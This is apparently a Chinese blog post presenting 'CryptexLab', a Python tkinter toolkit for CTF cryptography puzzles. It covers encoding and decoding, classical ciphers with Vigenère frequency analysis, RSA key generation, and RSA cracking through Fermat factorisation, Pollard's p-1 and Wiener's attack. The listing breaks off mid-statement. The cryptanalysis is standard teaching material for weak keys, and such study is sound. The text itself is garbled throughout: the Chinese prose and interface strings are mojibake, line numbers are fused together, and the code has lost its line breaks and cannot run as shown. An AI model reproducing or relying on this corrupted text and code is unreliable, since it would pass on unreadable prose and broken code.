¹æ®å…³é”®è¯è‡ªåŠ¨æŸ¥æ‰¾éå†è§£å¯†çš„ç»“æœä¸­æ˜¯å¦æœ‰ç¬¦åˆè¦æ±‚çš„ã€‚ ç»´å‰å°¼äºšå¯†ç ï¼š ç»™å®šå¯†æ–‡ä»¥åŠå¯†é’¥è¿›è¡Œè§£å¯†ï¼ˆæ”¯æŒå¯†æ–‡ä¸­å«æœ‰ç©ºæ ¼ä»¥åŠç‰¹æ®Šç¬¦å·ï¼‰ ç»™å®šå¯†æ–‡ï¼Œæ ¹æ®è¯é¢‘åˆ†æå°è¯•è§£å¯†ï¼ˆç”±äºæ˜¯åŸºäºç»Ÿè®¡çš„æ–¹æ³•ï¼Œæ‰€ä»¥åªæœ‰å½“å¯†æ–‡è¶³å¤Ÿé•¿æ—¶å‡†ç¡®ç‡æ‰ä¼šç›¸å¯¹è¾ƒé«˜ï¼‰ RSAï¼š PEM ç”ŸæˆPEM ç»™å®šp,q,eçš„å€¼ï¼Œè‡ªåŠ¨è®¡ç®—å¹¶ç”ŸæˆPEMç§é’¥ï¼Œå…¬é’¥ä»¥åŠæ‰€æœ‰å‚æ•°ä¿¡æ¯ è§£æPEMï¼š è‡ªåŠ¨åˆ¤æ–­å…¬é’¥/ç§é’¥å¹¶æå–å‚æ•° è§£æå®Œæˆåå¯ä»¥é€‰æ‹©å°†å‚æ•°ä¼ é€’åˆ°ç ´è§£RSAæ¿å—ã€‚ ç ´è§£RSAï¼š ç»™å®š ï¼ˆnï¼‰,d,p,q,cï¼ˆæˆ–æ›´å¤šï¼‰å‚æ•°è‡ªåŠ¨è§£å¯†ï¼ˆå°†å¯†æ–‡ c è§£å¯†å¹¶è½¬æˆtextæ ¼å¼ï¼‰ï¼› ç»™å®š ï¼ˆnï¼‰,e,p,qï¼Œè‡ªåŠ¨è®¡ç®— d ï¼› ç»™å®š ï¼ˆnï¼‰,e,p,q,c ï¼Œè‡ªåŠ¨è®¡ç®— d ï¼Œå¹¶è§£å¯†å¯†æ–‡ï¼› ç»™å®š nï¼Œå³å¯è¿›è¡ŒFermat-Factorizationï¼ŒPollardâ€™s p-1ç®—æ³•å°è¯•è´¨å› æ•°åˆ†è§£ nï¼ˆå‡å¯æ‰‹åŠ¨è®¾ç½®ç®—æ³•å¾ªç¯ä¸Šé™ï¼‰ï¼› ç»™å®š n,eï¼Œå³å¯è¿›è¡Œ Wienerâ€™s Attack ï¼ˆå‡å¯æ‰‹åŠ¨è®¾ç½®ç®—æ³•å¾ªç¯ä¸Šé™ï¼‰ï¼› å“ˆå¸Œï¼š SHA256ï¼š è®¡ç®—SHA256 MD5ï¼š è®¡ç®—MD5 æ•ˆæœ ç¯å¢ƒå°†ä¸‹é¢å†…å®¹ä¿å­˜æˆrequirements.txt: 12345tkpycryptodomecryptographybase58base91 å¹¶åœ¨å‘½ä»¤è¡Œè¾“å…¥ 1pip install -r requirements.txt å³å¯ã€‚ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880import tkinter as tkfrom tkinter import scrolledtextimport mathimport reimport base64import base58import base91from cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.number import long_to_bytesfrom collections import Counter, defaultdictimport stringimport hashlib# ------------------ æ”»å‡»/è¾…åŠ©å‡½æ•° ------------------def fermat_factor(n, max_iter=1000000): a = math.isqrt(n) if a * a &lt; n: a += 1 for _ in range(max_iter): b2 = a*a - n b = math.isqrt(b2) if b*b == b2: return a - b, a + b a += 1 return Nonedef pollard_p1(n, B=1000000): a = 2 for j in range(2, B): a = pow(a, j, n) g = math.gcd(a-1, n) if 1 &lt; g &lt; n: return g, n // g return Nonedef continued_fraction(numerator, denominator): cf = [] while denominator: a = numerator // denominator cf.append(a) numerator, denominator = denominator, numerator - a * denominator return cfdef convergents_from_cf(cf): n0, d0 = cf[0], 1 yield (n0, 1) if len(cf) == 1: return n1 = cf[1] * cf[0] + 1 d1 = cf[1] yield (n1, d1) for i in range(2, len(cf)): ni = cf[i] * n1 + n0 di = cf[i] * d1 + d0 yield (ni, di) n0, d0, n1, d1 = n1, d1, ni, didef is_perfect_square(x): if x &lt; 0: return False s = math.isqrt(x) return s * s == xdef wiener_attack(e, n): cf = continued_fraction(e, n) for k, d in convergents_from_cf(cf): if k == 0: continue if (e * d - 1) % k != 0: continue phi = (e * d - 1) // k s = n - phi + 1 discr = s*s - 4*n if discr &gt;= 0 and is_perfect_square(discr): t = math.isqrt(discr) p = (s + t) // 2 q = (s - t) // 2 if p * q == n: return d return None# ------------------ åˆå§‹åŒ–çª—å£ ------------------root = tk.Tk()root.title(&quot;CryptexLab&quot;)root.geometry(&quot;800x800&quot;)font_title = (&#x27;å¾®è½¯é›…é»‘&#x27;, 12, &#x27;bold&#x27;)font_text = (&#x27;å¾®è½¯é›…é»‘&#x27;, 10)# ------------------ èœå•æ  ------------------menubar = tk.Menu(root)root.config(menu=menubar)# æ¯åŠ ä¸€ä¸ªæ–°çš„é¡µé¢éƒ½è®°å¾—åœ¨è¿™é‡Œæ›´æ–°def show_frame(frame): for f in (encode_frame, decode_frame, RailFence_frame, Caesar_frame,Vigenere_frame, rsa_generate_pem_frame, rsa_pem_frame, rsa_crack_frame, sha256_frame, md5_frame): f.pack_forget() frame.pack(fill=tk.BOTH, expand=True)# ------------------ ç¼–ç ç•Œé¢ ------------------def encode_input(): raw = encode_input_text.get(&#x27;1.0&#x27;, tk.END).strip() encode_output_text.delete(&#x27;1.0&#x27;, tk.END) if not raw: return # è·å–é€‰ä¸­çš„ç¼–ç æ–¹å¼ selected_encoding = encode_var.get() try: if selected_encoding == &#x27;Base64&#x27;: result = base64.b64encode(raw.encode()).decode() elif selected_encoding == &#x27;Base32&#x27;: result = base64.b32encode(raw.encode()).decode() elif selected_encoding == &#x27;Base58&#x27;: result = base58.b58encode(raw.encode()).decode() elif selected_encoding == &#x27;Base91&#x27;: result = base91.encode(raw.encode()) elif selected_encoding == &#x27;Binary&#x27;: result = &#x27;&#x27;.join(format(ord(c), &#x27;08b&#x27;) for c in raw) elif selected_encoding == &#x27;Hex&#x27;: result = raw.encode().hex() else: result = &quot;è¯·é€‰æ‹©ç¼–ç æ–¹å¼&quot; encode_output_text.insert(tk.END, result) except Exception as e: encode_output_text.insert(tk.END, f&quot;ç¼–ç å¤±è´¥: &#123;e&#125;&quot;)encode_frame = tk.Frame(root)# å¸ƒå±€tk.Label(encode_frame, text=&#x27;è¯·è¾“å…¥è¦ç¼–ç çš„å†…å®¹ï¼š&#x27;, font=font_title).pack(pady=(10, 0))encode_input_text = scrolledtext.ScrolledText(encode_frame, height=6, font=font_text, wrap=tk.WORD)encode_input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ç¼–ç é€‰é¡¹encode_options_frame = tk.Frame(encode_frame)tk.Label(encode_options_frame, text=&#x27;é€‰æ‹©ç¼–ç æ–¹å¼ï¼š&#x27;, font=font_text).pack(side=tk.LEFT, padx=(0, 10))encode_var = tk.StringVar(value=&#x27;Base64&#x27;)encode_radio_frame = tk.Frame(encode_options_frame)encode_options = [&#x27;Base64&#x27;, &#x27;Base32&#x27;, &#x27;Base58&#x27;, &#x27;Base91&#x27;, &#x27;Binary&#x27;, &#x27;Hex&#x27;]for option in encode_options: tk.Radiobutton(encode_radio_frame, text=option, variable=encode_var, value=option, font=font_text).pack(side=tk.LEFT, padx=5)encode_radio_frame.pack(side=tk.LEFT)encode_options_frame.pack(pady=10)tk.Button(encode_frame, text=&#x27;å¼€å§‹ç¼–ç &#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=encode_input).pack(pady=10)tk.Label(encode_frame, text=&#x27;ç¼–ç ç»“æœï¼š&#x27;, font=font_title).pack()encode_output_text = scrolledtext.ScrolledText(encode_frame, height=10, font=font_text, wrap=tk.WORD)encode_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ è§£ç ç•Œé¢ ------------------def is_binary(s): return all(c in &#x27;01&#x27; for c in s) and len(s) % 8 == 0def decode_bytes(byte_data): try: text = byte_data.decode(&#x27;utf-8&#x27;) return text, True except UnicodeDecodeError: return byte_data.hex(), Falsedef looks_like_base64(s): return len(s) % 4 == 0 and re.fullmatch(r&#x27;[A-Za-z0-9+/=]+&#x27;, s) is not Nonedef looks_like_base32(s): return len(s) % 8 == 0 and re.fullmatch(r&#x27;[A-Z2-7=]+&#x27;, s, re.IGNORECASE) is not Nonedef looks_like_base58(s): return all(c in base58.alphabet.decode() for c in s)def looks_like_base91(s): return all(33 &lt;= ord(c) &lt;= 126 for c in s)def try_decode(s, func): decoded = func(s) return decode_bytes(decoded)def recursive_decode(s, path=None, all_paths=None, max_depth=10): if path is None: path = [] if all_paths is None: all_paths = [] if len(path) &gt;= max_depth: return all_paths decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), # (&#x27;Base91&#x27;, looks_like_base91, base91.decode), # å˜ä¸ºæŒ‰éœ€åŠ å…¥ (&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i + 8], 2) for i in range(0, len(x), 8))), (&#x27;Hex&#x27;, lambda x: True, lambda x: bytes.fromhex(x)), ] # ä»…å½“å‹¾é€‰â€œè€ƒè™‘Base91â€æ—¶ï¼Œæ‰æŠŠ Base91 æ’å…¥åˆ°ä¸åŸæ¥ç›¸åŒçš„ä½ç½®ï¼ˆBase58 ä¹‹åã€Binary ä¹‹å‰ï¼‰ if &#x27;consider_base91_var&#x27; in globals() and consider_base91_var.get(): decoders.insert(3, (&#x27;Base91&#x27;, looks_like_base91, base91.decode)) for name, detector, func in decoders: if detector(s): try: text, is_utf8 = try_decode(s, func) except Exception: continue mode = &#x27;(UTF-8)&#x27; if is_utf8 else &#x27;(hex)&#x27; new_path = path + [(name, text, mode)] all_paths.append(new_path) if is_utf8: recursive_decode(text, new_path, all_paths, max_depth) return all_pathsdef select_final_path(paths): utf_paths = [p for p in paths if p[-1][2] == &#x27;(UTF-8)&#x27;] if utf_paths: max_len = max(len(p) for p in utf_paths) for p in utf_paths: if len(p) == max_len: return p max_len = max(len(p) for p in paths) for p in paths: if len(p) == max_len: return pdef decode_input(): raw = input_text.get(&#x27;1.0&#x27;, tk.END).strip().replace(&#x27; &#x27;, &#x27;&#x27;) decode_output_text.delete(&#x27;1.0&#x27;, tk.END) if not raw: return paths = recursive_decode(raw) if not paths: decode_output_text.insert(tk.END, &#x27;æ— æ³•è¯†åˆ«æˆ–è§£ç æ­¤å†…å®¹ã€‚&#x27;) return final = select_final_path(paths) for i, (name, text, mode) in enumerate(final, 1): decode_output_text.insert(tk.END, f&quot;ç¬¬&#123;i&#125;æ­¥ - &#123;name&#125; &#123;mode&#125;\\nç»“æœï¼š&#123;text&#125;\\n\\n&quot;) if len(final) == 1 and final[0][2] == &#x27;(UTF-8)&#x27;: s = final[0][1] extra_decoders = [ (&#x27;Base64&#x27;, looks_like_base64, base64.b64decode), (&#x27;Base32&#x27;, looks_like_base32, base64.b32decode), (&#x27;Base58&#x27;, looks_like_base58, base58.b58decode), # Base91 å˜ä¸ºå¯é€‰ ] if &#x27;consider_base91_var&#x27; in globals() and consider_base91_var.get(): extra_decoders.append((&#x27;Base91&#x27;, looks_like_base91, base91.decode)) # ä¿æŒ Binary æ”¾åœ¨æœ€åï¼Œä¸åŸé€»è¾‘ä¸€è‡´ extra_decoders.append((&#x27;Binary&#x27;, is_binary, lambda x: bytes(int(x[i:i + 8], 2) for i in range(0, len(x), 8)))) for name, detector, func in extra_decoders: if detector(s): try: data = func(s) hex_out = data.hex() decode_output_text.insert(tk.END, f&quot;ç¬¬2æ­¥ - &#123;name&#125; (hex)\\nç»“æœï¼š&#123;hex_out&#125;\\n&quot;) break except Exception: continue# å¸ƒå±€decode_frame = tk.Frame(root)tk.Label(decode_frame, text=&#x27;è¯·è¾“å…¥ç¼–ç å†…å®¹ï¼š&#x27;, font=font_title).pack(pady=(10, 0))input_text = scrolledtext.ScrolledText(decode_frame, height=6, font=font_text, wrap=tk.WORD)input_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# Base91 å¯é€‰consider_base91_var = tk.BooleanVar(value=False) # é»˜è®¤ä¸å‹¾é€‰tk.Checkbutton(decode_frame, text=&#x27;è€ƒè™‘Base91&#x27;, variable=consider_base91_var, font=font_text).pack(anchor=&#x27;w&#x27;, padx=20)tk.Button(decode_frame, text=&#x27;å¼€å§‹è§£ç &#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=decode_input).pack(pady=10)tk.Label(decode_frame, text=&#x27;è¾“å‡ºç»“æœï¼š&#x27;, font=font_title).pack()decode_output_text = scrolledtext.ScrolledText(decode_frame, height=10, font=font_text, wrap=tk.WORD)decode_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ å‡¯æ’’è§£å¯†ç•Œé¢ ------------------def caesar_decrypt(text, shift): result = &#x27;&#x27; for ch in text: if &#x27;A&#x27; &lt;= ch &lt;= &#x27;Z&#x27;: result += chr((ord(ch)-ord(&#x27;A&#x27;)-shift)%26+ord(&#x27;A&#x27;)) elif &#x27;a&#x27; &lt;= ch &lt;= &#x27;z&#x27;: result += chr((ord(ch)-ord(&#x27;a&#x27;)-shift)%26+ord(&#x27;a&#x27;)) else: result += ch return resultdef decrypt_caesar(): text = caesar_input.get(&#x27;1.0&#x27;, tk.END).strip() caesar_output_text.delete(&#x27;1.0&#x27;, tk.END) keyword = keyword_entry.get().strip() if var_traverse.get(): for k in range(26): dec = caesar_decrypt(text, k) if not keyword or keyword.lower() in dec.lower(): caesar_output_text.insert(tk.END, f&quot;Key=&#123;k&#125;:\\n&#123;dec&#125;\\n\\n&quot;) else: try: k = int(key_entry.get()) dec = caesar_decrypt(text, k) caesar_output_text.insert(tk.END, dec) except ValueError: caesar_output_text.insert(tk.END, &quot;å¯†é’¥åº”ä¸ºæ•´æ•°ã€‚&quot;)Caesar_frame = tk.Frame(root)# å¸ƒå±€tk.Label(Caesar_frame, text=&#x27;å‡¯æ’’å¯†æ–‡è¾“å…¥ï¼š&#x27;, font=font_title).pack(pady=(10,0))caesar_input = scrolledtext.ScrolledText(Caesar_frame, height=5, font=font_text)caesar_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)key_row = tk.Frame(Caesar_frame)tk.Label(key_row, text=&#x27;å¯†é’¥ (0-25):&#x27;, font=font_text).pack(side=tk.LEFT)key_entry = tk.Entry(key_row, width=5)key_entry.pack(side=tk.LEFT, padx=(5,15))tk.Label(key_row, text=&#x27;å…³é”®è¯ (å¯é€‰):&#x27;, font=font_text).pack(side=tk.LEFT)keyword_entry = tk.Entry(key_row, width=20)keyword_entry.pack(side=tk.LEFT, padx=5)key_row.pack(pady=10)var_traverse = tk.BooleanVar(value=True)tk.Checkbutton(Caesar_frame, text=&#x27;éå†æ‰€æœ‰å¯èƒ½&#x27;, variable=var_traverse).pack()tk.Button(Caesar_frame, text=&#x27;å¼€å§‹è§£å¯†&#x27;, font=font_title, bg=&#x27;#2196F3&#x27;, fg=&#x27;white&#x27;, command=decrypt_caesar).pack(pady=10, fill=&#x27;x&#x27;, padx=20)tk.Label(Caesar_frame, text=&#x27;è¾“å‡ºç»“æœï¼š&#x27;, font=font_title).pack()caesar_output_text = scrolledtext.ScrolledText(Caesar_frame, height=10, font=font_text)caesar_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ æ …æ å¯†ç ç•Œé¢ ------------------def rail_fence_encrypt(text, rails): if rails &lt;= 1 or not text: return text rows = [&#x27;&#x27;] * rails r, step = 0, 1 for ch in text: rows[r] += ch if r == 0: step = 1 elif r == rails - 1: step = -1 r += step return &#x27;&#x27;.join(rows)def rail_fence_decrypt(cipher, rails): if rails &lt;= 1 or not cipher: return cipher n = len(cipher) # å…ˆè·‘ä¸€éå¾—åˆ°æ¯ä¸ªä½ç½®æ‰€åœ¨â€œæ â€çš„åºåˆ— pattern = [] r, step = 0, 1 for _ in range(n): pattern.append(r) if r == 0: step = 1 elif r == rails - 1: step = -1 r += step # ç»Ÿè®¡æ¯ä¸€æ æœ‰å¤šå°‘å­—ç¬¦ counts = [pattern.count(i) for i in range(rails)] # æŒ‰æ æŠŠå¯†æ–‡åˆ‡ç‰‡å›å¡« idx = 0 rows = [] for c in counts: rows.append(list(cipher[idx: idx + c])) idx += c # å†æŒ‰ pattern é¡ºåºé‡å»ºæ˜æ–‡ pos_in_row = [0] * rails res = [] for row_id in pattern: res.append(rows[row_id][pos_in_row[row_id]]) pos_in_row[row_id] += 1 return &#x27;&#x27;.join(res)def rf_do(op): rf_output_text.delete(&#x27;1.0&#x27;, tk.END) text = rf_input.get(&#x27;1.0&#x27;, tk.END).strip() rails_str = rf_key_entry.get().strip() if not text: rf_output_text.insert(tk.END, &quot;è¯·è¾“å…¥æ–‡æœ¬ã€‚&quot;) return try: rails = int(rails_str) if rails &lt; 2: raise ValueError except ValueError: rf_output_text.insert(tk.END, &quot;æ æ•°åº”ä¸ºæ•´æ•°ä¸” â‰¥ 2ã€‚&quot;) return if op == &#x27;enc&#x27;: out = rail_fence_encrypt(text, rails) else: out = rail_fence_decrypt(text, rails) rf_output_text.insert(tk.END, out)RailFence_frame = tk.Frame(root)# å¸ƒå±€tk.Label(RailFence_frame, text=&#x27;æ …æ å¯†ç  - è¾“å…¥ï¼š&#x27;, font=font_title).pack(pady=(10,0))rf_input = scrolledtext.ScrolledText(RailFence_frame, height=6, font=font_text, wrap=tk.WORD)rf_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)rf_mid = tk.Frame(RailFence_frame)tk.Label(rf_mid, text=&#x27;å¯†é’¥ï¼š&#x27;, font=font_text).pack(side=tk.LEFT)rf_key_entry = tk.Entry(rf_mid, width=10)rf_key_entry.insert(0, &#x27;3&#x27;) # é»˜è®¤ 3 æ rf_key_entry.pack(side=tk.LEFT, padx=(5,15))op_var = tk.StringVar(value=&#x27;enc&#x27;)# tk.Label(rf_mid, text=&#x27;æ“ä½œï¼š&#x27;, font=font_text).pack(side=tk.LEFT, padx=(10,0))tk.Radiobutton(rf_mid, text=&#x27;åŠ å¯†&#x27;, variable=op_var, value=&#x27;enc&#x27;).pack(side=tk.LEFT)tk.Radiobutton(rf_mid, text=&#x27;è§£å¯†&#x27;, variable=op_var, value=&#x27;dec&#x27;).pack(side=tk.LEFT)rf_mid.pack(pady=8)btn_row = tk.Frame(RailFence_frame)tk.Button(btn_row, text=&#x27;åŠ è§£å¯†&#x27;, font=font_title, bg=&#x27;#4CAF50&#x27;, fg=&#x27;white&#x27;, command=lambda: rf_do(op_var.get())).pack(side=tk.LEFT, padx=8)btn_row.pack(pady=6)tk.Label(RailFence_frame, text=&#x27;è¾“å‡ºç»“æœï¼š&#x27;, font=font_title).pack()rf_output_text = scrolledtext.ScrolledText(RailFence_frame, height=10, font=font_text, wrap=tk.WORD)rf_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ ç»´å‰å°¼äºšè§£å¯†ç•Œé¢ ------------------# è¯é¢‘åˆ†æ# è‹±æ–‡å­—æ¯é¢‘ç‡ï¼ˆå½’ä¸€åŒ–ï¼‰ENG_FREQ_RAW = &#123; &#x27;A&#x27;: 8.167, &#x27;B&#x27;: 1.492, &#x27;C&#x27;: 2.782, &#x27;D&#x27;: 4.253, &#x27;E&#x27;:12.702, &#x27;F&#x27;: 2.228, &#x27;G&#x27;: 2.015, &#x27;H&#x27;: 6.094, &#x27;I&#x27;: 6.966, &#x27;J&#x27;: 0.153, &#x27;K&#x27;: 0.772, &#x27;L&#x27;: 4.025, &#x27;M&#x27;: 2.406, &#x27;N&#x27;: 6.749, &#x27;O&#x27;: 7.507, &#x27;P&#x27;: 1.929, &#x27;Q&#x27;: 0.095, &#x27;R&#x27;: 5.987, &#x27;S&#x27;: 6.327, &#x27;T&#x27;: 9.056, &#x27;U&#x27;: 2.758, &#x27;V&#x27;: 0.978, &#x27;W&#x27;: 2.360, &#x27;X&#x27;: 0.150, &#x27;Y&#x27;: 1.974, &#x27;Z&#x27;: 0.074,&#125;ENG_FREQ = &#123;k: v / sum(ENG_FREQ_RAW.values()) for k, v in ENG_FREQ_RAW.items()&#125;ALPHABET = string.ascii_uppercase# å·¥å…·å‡½æ•°def index_of_coincidence(text): N = len(text) if N &lt; 2: return 0.0 freq = Counter(text) return sum(n * (n - 1) for n in freq.values()) / (N * (N - 1))def avg_ic_for_len(cipher, k): return sum(index_of_coincidence(cipher[i::k]) for i in range(k)) / kdef chi_square_list(col): N = len(col) observed = Counter(col) result = [] for shift in range(26): chi = 0.0 for i, c in enumerate(ALPHABET): expected = ENG_FREQ[c] * N shifted = ALPHABET[(i + shift) % 26] observed_count = observed.get(shifted, 0) chi += ((observed_count - expected) ** 2) / expected result.append(chi) return resultdef kasiski_candidates(cipher, n_min=3, n_max=6, key_lo=10, key_hi=50, top_n=8): positions = defaultdict(list) for n in range(n_min, n_max + 1): for i in range(len(cipher) - n + 1): gram = cipher[i:i+n] positions[gram].append(i) votes = &#123;&#125; for locs in positions.values(): if len(locs) &lt; 2: continue for i in range(len(locs)): for j in range(i + 1, len(locs)): dist = locs[j] - locs[i] for k in range(key_lo, key_hi + 1): if dist % k == 0: votes[k] = votes.get(k, 0) + 1 return sorted(votes, key=votes.get, reverse=True)[:top_n]def recover_key(cipher, key_lo=10, key_hi=50, kasiski_top=8, ic_top=3): cipher = &#x27;&#x27;.join(filter(str.isalpha, cipher.upper())) candidates = kasiski_candidates(cipher, key_lo=key_lo, key_hi=key_hi, top_n=kasiski_top) if not candidates: candidates = list(range(key_lo, key_hi + 1)) ic_scores = &#123;k: avg_ic_for_len(cipher, k) for k in candidates&#125; top_lengths = sorted(ic_scores, key=ic_scores.get, reverse=True)[:ic_top] best_key = None best_score = float(&#x27;inf&#x27;) for k in top_lengths: key = [] total_chi = 0.0 for i in range(k): col = cipher[i::k] chis = chi_square_list(col) best_shift = chis.index(min(chis)) key.append(ALPHABET[best_shift]) total_chi += chis[best_shift] if total_chi &lt; best_score: best_key = &#x27;&#x27;.join(key) best_score = total_chi return best_key, best_score#æ™®é€šdef vigenere_decrypt(cipher, key): vigenere_result = &#x27;&#x27; klen = len(key) j = 0 # ç”¨äºå¯†é’¥ç´¢å¼•ï¼Œåªå¯¹å­—æ¯é€’å¢ for c in cipher: if c.isalpha(): k = key[j % klen] ki = ord(k.upper()) - ord(&#x27;A&#x27;) # ç»Ÿä¸€å¤„ç†å¤§å°å†™å¯†é’¥ if c.isupper(): vigenere_result += chr((ord(c) - ord(&#x27;A&#x27;) - ki) % 26 + ord(&#x27;A&#x27;)) else: vigenere_result += chr((ord(c) - ord(&#x27;a&#x27;) - ki) % 26 + ord(&#x27;a&#x27;)) j += 1 else: vigenere_result += c # éå­—æ¯ç›´æ¥åŠ  return vigenere_resultdef decrypt_vigenere(): text = vigenere_input.get(&#x27;1.0&#x27;, tk.END).strip() key = vigenere_key_entry.get().strip() vigenere_output_text.delete(&#x27;1.0&#x27;, tk.END) if not text: vigenere_output_text.insert(tk.END, &quot;è¯·è¾“å…¥å¯†æ–‡ã€‚&quot;) return # å¦‚æœæ²¡æœ‰å¯†é’¥ï¼Œå°±ä½¿ç”¨é¢‘ç‡åˆ†ææ¢å¤ if not key: key, score = recover_key(text) vigenere_output_text.insert(tk.END, f&quot;[è‡ªåŠ¨è¯†åˆ«å¯†é’¥]ï¼š&#123;key&#125; (Ï‡Â²å¾—åˆ†=&#123;score:.2f&#125;)\\n\\n&quot;) result = vigenere_decrypt(text, key) vigenere_output_text.insert(tk.END, result)Vigenere_frame = tk.Frame(root)# å¸ƒå±€tk.Label(Vigenere_frame, text=&#x27;ç»´å‰å°¼äºšå¯†æ–‡è¾“å…¥ï¼š&#x27;, font=font_title).pack(pady=(10,0))vigenere_input = scrolledtext.ScrolledText(Vigenere_frame, height=5, font=font_text)vigenere_input.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)key_row = tk.Frame(Vigenere_frame)tk.Label(key_row, text=&#x27;å¯†é’¥ï¼š&#x27;, font=font_text).pack(side=tk.LEFT)vigenere_key_entry = tk.Entry(key_row, width=20)vigenere_key_entry.pack(side=tk.LEFT, padx=5)key_row.pack(pady=10)tk.Label(Vigenere_frame, text=&#x27;ï¼ˆå¦‚æœæ²¡æœ‰å¯†é’¥åˆ™é»˜è®¤è¿›è¡Œè¯é¢‘åˆ†æï¼‰&#x27;, font=font_text, fg=&#x27;gray&#x27;).pack()tk.Button(Vigenere_frame, text=&#x27;å¼€å§‹è§£å¯†&#x27;, font=font_title, bg=&#x27;#009688&#x27;, fg=&#x27;white&#x27;, command=decrypt_vigenere).pack(pady=10, fill=&#x27;x&#x27;, padx=20)tk.Label(Vigenere_frame, text=&#x27;è¾“å‡ºç»“æœï¼š&#x27;, font=font_title).pack()vigenere_output_text = scrolledtext.ScrolledText(Vigenere_frame, height=10, font=font_text)vigenere_output_text.pack(fill=tk.BOTH, padx=20, pady=5, expand=True)# ------------------ RSA - ç”ŸæˆPEMç•Œé¢ ------------------def generate_pem(): rsa_generate_pem_output.delete(&#x27;1.0&#x27;, tk.END) def get_int(name): txt = rsa_generate_entries[name].get().strip().replace(&quot; &quot;, &quot;&quot;) return int(txt) if txt else None p = get_int(&#x27;p&#x27;) q = get_int(&#x27;q&#x27;) e = get_int(&#x27;e&#x27;) if None in (p, q, e): rsa_generate_pem_output.insert(tk.END, &quot;è¯·å¡«å†™æ‰€æœ‰å¿…éœ€å‚æ•°ï¼šp, q, e\\n&quot;) return try: # è®¡ç®—å…¶ä»–å‚æ•° n = p * q phi = (p - 1) * (q - 1) d = pow(e, -1, phi) # ç”Ÿæˆç§é’¥ from cryptography.hazmat.primitives.asymmetric import rsa from cryptography.hazmat.primitives import serialization private_key = rsa.RSAPrivateNumbers( p=p, q=q, d=d, dmp1=d % (p-1), dmq1=d % (q-1), iqmp=pow(q, -1, p), public_numbers=rsa.RSAPublicNumbers(e=e, n=n) ).private_key(backend=default_backend()) # ç”Ÿæˆå…¬é’¥ public_key = private_key.public_key() # è¾“å‡ºPEMæ ¼å¼ private_pem = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption() ).decode() public_pem = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo ).decode() rsa_generate_pem_output.insert(tk.END, &quot;=== RSA ç§é’¥ (PEMæ ¼å¼) ===\\n\\n&quot;, &quot;bold&quot;) rsa_generate_pem_output.insert(tk.END, private_pem) rsa_generate_pem_output.insert(tk.END, &quot;\\n\\n=== RSA å…¬é’¥ (PEMæ ¼å¼) ===\\n\\n&quot;, &quot;bold&quot;) rsa_generate_pem_output.insert(tk.END, public_pem) rsa_generate_pem_output.insert(tk.END, &quot;\\n\\n=== å‚æ•°ä¿¡æ¯ ===\\n&quot;, &quot;bold&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;n = &#123;n&#125;\\n&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;e = &#123;e&#125;\\n&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;d = &#123;d&#125;\\n&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;p = &#123;p&#125;\\n&quot;) rsa_generate_pem_output.insert(tk.END, f&quot;q = &#123;q&#125;\\n&quot;) except Exception as e: rsa_generate_pem_output.insert(tk.END, f&quot;ç”Ÿæˆå¤±è´¥: &#123;e&#125;\\n&quot;)rsa_generate_pem_frame = tk.Frame(root)# å¸ƒå±€tk.Label(rsa_generate_pem_frame, text=&#x27;è¯·è¾“å…¥ RSA å‚æ•°ï¼ˆåè¿›åˆ¶æ•´æ•°ï¼‰ï¼š&#x27;, font=font_title).pack(pady=(10,5))rsa_generate_entries = &#123;&#125;for label in 